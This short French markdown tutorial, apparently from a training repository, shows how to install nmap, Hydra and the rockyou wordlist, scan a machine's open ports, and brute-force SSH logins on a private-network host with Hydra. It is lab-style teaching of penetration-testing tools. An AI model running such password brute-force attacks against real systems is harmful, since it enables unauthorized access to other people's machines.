# Attaque sur une machine

### Installation des outils

##### nmap

````
 sudo apt install nmap 

````

##### Hydra

```` 
sudo apt install hydra

````

##### Installation d'une wordlist 

````
sudo apt install wordlists
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
````

### Detection des ports ouvert sur la machine concerné

````

nmap -A "ip address"

````

![alt tag](https://github.com/Jrb62/Formation-AIS-et-DevOps/blob/main/screenshot/Capture%20d'%C3%A9cran%202024-09-04%20123412.png)

### Utilisation de Hydra

````
sudo hydra -t 32 -l user -P /usr/share/wordlists/rockyou.txt -vV 10.0.0.206 ssh
````
![alt tag](https://github.com/Jrb62/Formation-AIS-et-DevOps/blob/main/screenshot/Capture%20d'%C3%A9cran%202024-09-04%20133430.png)

